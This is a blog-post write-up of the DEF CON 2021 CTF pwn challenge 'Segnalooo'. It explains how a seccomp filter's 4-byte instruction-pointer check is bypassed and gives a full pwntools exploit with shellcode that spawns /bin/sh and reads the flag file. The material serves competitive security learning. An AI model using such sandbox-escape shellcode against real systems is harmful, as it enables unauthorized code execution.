<!DOCTYPE html>
<html lang="en-us">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="theme-color" content="dark">
    <title> Defcon-2021-Segnalooo | mhibio</title>
    
    
    
    <link rel="stylesheet" href="/sass/main.min.cf333ba0020ffd9a1c1eee1d846354ea772a976b6fff93b15381f337a3390476.css">
</head>

    <body class="dark">
        <nav class="navbar">
    <div class="container">
        <div class="flex">
            <div>
                <a class="brand" href="/">
                    
                    <span class="emoji">
                        ðŸ‘‹
                    </span>
                    
                    mhibio
                    </a>
            </div>
            <div class="flex">
                
                <a href="/post/">Posts</a>
                
                <a href="/whoami">Whoami</a>
                
                <button id="dark-mode-button"></button>
                
            </div>
            </div>
    </div>
</nav>
        <main>
            

<div class="container">
    <article>
        <header class="article-header">
            <div class="thumb">
                <div>
                    <h1>Defcon-2021-Segnalooo</h1>
                    <div class="post-meta">
                        <div>
                            By mhibio on <time>May 06, 2021</time>
                        </div>
                        <div class="tags">
                            
                            <a href="/tags/pwn/">pwn</a>
                            
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </article>

    <div class="article-post">
    <p>It&rsquo;s the first problem I solved at Defcon.<br>
and, Because I played the defcon, I messed up the exam.ðŸ˜‚</p>
<p><strong>Solved with <code>Jsec</code>, <code>Epist</code></strong></p>
<h2 id="tldr">Tl;dr</h2>
<p><strong><code>Trick</code> on Seccomp Filter&rsquo;s check.</strong><br>
<strong><code>Brute force shellcoding</code> challenge.</strong><br>
<strong>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</strong></p>
<h2 id="binary">Binary</h2>
<ol start="0">
<li>Set Signal Handler on Signum 5 ( <code>SIGTRAP</code> )</li>
<li>Allocate Memory twice ( addr1 : <code>0x10XXXXXXXXXX</code>, addr2 : <code>0x5XXXXXXXXXXX</code> )<br>
1-1. Input our Shellcode.</li>
<li>Munmap all Memory except addr1, addr2</li>
<li>Call Signal Handler with <code>int3</code></li>
<li>After Signal Handler, <code>IP</code> returns to our Shellcode.<br>
=&gt; There is two Problems. ( Seccomp filter, <code>ud2</code> instruction )</li>
</ol>
<h2 id="seccomp-filter">Seccomp Filter</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mo">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mo">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
 <span class="mo">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x08</span> <span class="mh">0x00</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;=</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
 <span class="mo">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
 <span class="mo">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000023</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">nanosleep</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
 <span class="mo">0006</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000008</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">instruction_pointer</span>
 <span class="mo">0007</span><span class="p">:</span> <span class="mh">0x25</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x80000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">8</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">000</span><span class="mi">9</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x01</span> <span class="mh">0x0000003b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span> <span class="k">else</span> <span class="n">goto</span> <span class="mo">0011</span>
 <span class="mo">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
 <span class="mo">0011</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0012</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</code></pre></td></tr></table>
</div>
</div><p>Only <code>munmap</code> and <code>nanosleep</code> Syscall are available.<br>
or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
<p><strong>But, all Memory is bigger than <code>0x80000000</code>.</strong><br>
<strong>All Syscall gadgets fail to bypass <code>IP CHECK</code>.</strong><br>
<strong>How can I bypass <code>IP check</code>?</strong></p>
<blockquote>
<p>One interesting thing is that Seccomp only do 4 bytes of ip check.**</p>
</blockquote>
<p>So we can bypass <strong><code>IP CHECK</code></strong> by using a syscall gadget in <code>0x10XXXXXXXXXX</code>.<br>
( Binary always causes 4 bytes of addr1 address (<code>0x10XXXXXXXXXX</code>) to be smaller than <code>0x80000000</code> )</p>
<h2 id="ud2-instruction">ud2 instruction</h2>
<p><code>ud2 instruction</code> means undefined instruction.<br>
when <code>IP</code> returns to our shellcode, <code>ud2</code> instruction is executed.<br>
-&gt; Process stopped with exit code -4 ( <code>SIGILL</code> )</p>
<p>But, I can execute only 1 instruction.<br>
<strong>if I execute <code>icebp (0xf1)</code>, I can escape <code>ud2</code> instruction.</strong></p>
<h2 id="leak-memory">leak memory</h2>
<p>if <code>nanosleep's rdi</code> is invalid memory, return <code>0xfffffffffffffff2</code>.<br>
else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</code>, return <code>0xffffffffffffffea</code>.</p>
<p>so we can leak memory <code>0x10XXXXXXXXXX</code> by brute force<br>
then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
<h2 id="exploit">Exploit</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>

<span class="k">def</span> <span class="nf">pack64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>  <span class="k">return</span> <span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>

<span class="n">sc</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">inc edi
</span><span class="s1">shl rdi, 44
</span><span class="s1">mov rsi, rsp
</span><span class="s1">
</span><span class="s1">add rdi, 0x1000
</span><span class="s1">xor rax, rax
</span><span class="s1">mov al, 35
</span><span class="s1">syscall
</span><span class="s1">
</span><span class="s1">cmp al, 0xea
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="n">sc2</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">lea rbx, [rdi+0xb4]
</span><span class="s1">lea rsi, [rsp+0x30]
</span><span class="s1">xor rdi, rdi
</span><span class="s1">xor eax, eax
</span><span class="s1">mov ax, 322
</span><span class="s1">jmp rbx
</span><span class="s1">nop
</span><span class="s1">
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s2">&#34;f1&#34;</span><span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;7405e9e6ffffff&#34;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;41&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">))</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">pack64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;90&#34;</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;2f62696e2f7368&#34;</span> <span class="c1">#binsh</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="c1">#p = process(&#39;./stub&#39;)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;segnalooo.challenges.ooo&#34;</span><span class="p">,</span> <span class="mi">4321</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Give me some code!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;while read line;do echo </span><span class="se">\&#34;</span><span class="s2">$line</span><span class="se">\&#34;</span><span class="s2">;done &lt; /flag&#34;</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="flag--ooos3riouslywh4tissigaltstack">Flag : OOO{s3riously,wh4tISsigaltstack???}</h2>

    </div>
</div>

<div class="container">
    
    <nav class="flex container suggested">
        
        
        
        <a rel="next" href="/post/des-encryption/" title="Next post (newer)">
            <span>Next</span>
            Des-Encryption.c
            </a> 
        
    </nav>
    
</div>
</main>


        </main>
        <footer class="footer flex">
    <section class="container">
        <nav class="footer-links">
            
            <a href="/index.xml">RSS</a>
            
        </nav>
    </section>
    
    <script async src="/js/features.min.fbb98c0fcd10d8a5d190b310ae564c7a945b7965fd24b63fb4f0dac94c80ffba.js"></script>
</footer>
    </body>
</html>